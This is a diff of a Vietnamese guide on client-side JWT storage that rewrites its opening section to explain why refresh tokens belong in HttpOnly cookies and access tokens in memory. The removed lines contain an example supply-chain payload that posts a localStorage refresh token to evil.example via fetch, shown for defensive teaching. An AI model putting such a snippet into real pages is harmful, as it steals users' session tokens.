@@ -7,7 +7,7 @@ description: "Triển khai JWT phía client siêu chi tiết: vì sao client kh�
 
 ## Mục lục
 
-- [1. Bối cảnh: một XSS đánh sập cả phiên](#1-bối-cảnh-một-xss-đánh-sập-cả-phiên)
+- [1. Trên client không có nơi nào an toàn tuyệt đối](#1-trên-client-không-có-nơi-nào-an-toàn-tuyệt-đối)
 - [2. Tổng quan: bản đồ quyết định phía client](#2-tổng-quan-bản-đồ-quyết-định-phía-client)
 - [3. Thách thức: không có nơi an toàn tuyệt đối](#3-thách-thức-không-có-nơi-an-toàn-tuyệt-đối)
 - [4. SPA: mẫu access-ở-memory + refresh-ở-cookie](#4-spa-mẫu-access-ở-memory--refresh-ở-cookie)
@@ -27,19 +27,23 @@ description: "Triển khai JWT phía client siêu chi tiết: vì sao client kh�
 
 ---
 
-## 1. Bối cảnh: một XSS đánh sập cả phiên
+## 1. Trên client không có nơi nào an toàn tuyệt đối
 
-Một SPA thương mại điện tử lưu cả access và refresh token vào `localStorage` "cho tiện, đỡ mất khi F5". Mọi thứ chạy tốt nhiều tháng. Rồi một ngày, đội marketing nhúng thêm một thẻ `<script>` của nhà cung cấp A/B testing bên thứ ba. Bản cập nhật của thư viện đó bị tấn công supply-chain, chèn một đoạn mã nhỏ:
+Trên trình duyệt hay mobile, không có nơi nào lưu token an toàn tuyệt đối. Mọi điểm lưu đều phơi ít nhất một rủi ro: `localStorage`/`IndexedDB` bị mọi đoạn JS đọc, biến JS mất khi reload, cookie `HttpOnly` thì trình duyệt tự gửi (CSRF). Vậy câu hỏi thực không phải "lưu ở đâu an toàn nhất" mà là *mỗi loại token cất ở đâu thì thiệt hại nhỏ nhất khi cái tồi tệ xảy ra*. Đây chính là xương sống của cả doc.
 
-```javascript
-// đoạn mã độc được tiêm qua thư viện bên thứ ba
-fetch('https://evil.example/collect', {
-  method: 'POST',
-  body: localStorage.getItem('refresh_token'),   // đọc thẳng từ localStorage
-});
+JWT chia làm hai loại với hai vòng đời khác nhau, và đó là chìa khoá để chọn nơi lưu:
+
+```diagram
+ACCESS TOKEN (ngắn hạn, vài–vài chục phút)
+  → mất nhiều cũng chỉ lộ một cửa sổ ngắn
+  → đặt Ở MEMORY (biến JS): XSS chỉ lấy được token đang sống tại khoảnh khắc chạy
+
+REFRESH TOKEN (dài hạn, nhiều ngày)
+  → lộ một cái là kẻ tấn công tạo access mới liên tục cả tuần
+  → phải NGOÀI TẦM JS: cookie HttpOnly (web) / Keychain·Keystore (mobile)
 ```
 
-Chỉ một dòng. Vì `localStorage` cho **mọi** JS trên trang đọc, refresh token (sống 7 ngày) bay sang server kẻ tấn công. Chúng dùng refresh token tạo access token mới liên tục, truy cập tài khoản người dùng mà không cần mật khẩu — và vì refresh sống lâu, cửa sổ lạm dụng kéo dài cả tuần.
+Để thấy vì sao sự phân biệt này quan trọng, hãy lấy một tình huống rất phổ biến: một SPA lưu *cả* access lẫn refresh token vào `localStorage` "cho tiện, đỡ mất khi F5". Một thư viện bên thứ ba (A/B testing, analytics...) bị nhiễm mã độc qua supply-chain, chạy đúng một dòng `localStorage.getItem('refresh_token')` rồi gửi sang server kẻ tấn công. Vì `localStorage` cho **mọi** JS trên trang đọc, refresh token sống 7 ngày bay ngay lập tức. Kẻ tấn công không cần mật khẩu — chỉ cần refresh token đó để tự cấp access mới, lạm dụng phiên cả tuần lễ.
 
 ```diagram
 Gốc rễ KHÔNG phải XSS (XSS sẽ luôn có khả năng xảy ra)
@@ -47,6 +51,8 @@ Gốc rễ là: refresh token (sống lâu) nằm nơi JS đọc được
   → một lỗ hổng JS bất kỳ = lộ toàn bộ phiên
 Bài học: trên client không thể "diệt XSS hoàn toàn", chỉ có thể GIẢM THIỆT HẠI khi nó xảy ra.
 ```
+
+Nếu cùng XSS đó chạy trong SPA dùng mẫu access-ở-memory + refresh-ở-cookie, mã độc chỉ lấy được access token đang sống (còn vài phút) — không chạm được refresh (nằm trong cookie `HttpOnly`, JS không đọc). Hậu quả thu hẹp từ "mất cả phiên 7 ngày" xuống "một access token sắp hết hạn".
 
 > [!IMPORTANT]
 > Nguyên tắc xuyên suốt: **refresh token (sống lâu) phải ngoài tầm JS** — cookie `HttpOnly` trên web, Keychain/Keystore trên mobile. **Access token (sống ngắn) ở memory** — mất khi reload nhưng khôi phục ngay bằng silent refresh. Tuyệt đối tránh `localStorage` cho bất kỳ token nào. Mục tiêu không phải "giấu token hoàn hảo" mà là *giảm thiệt hại* khi XSS xảy ra.
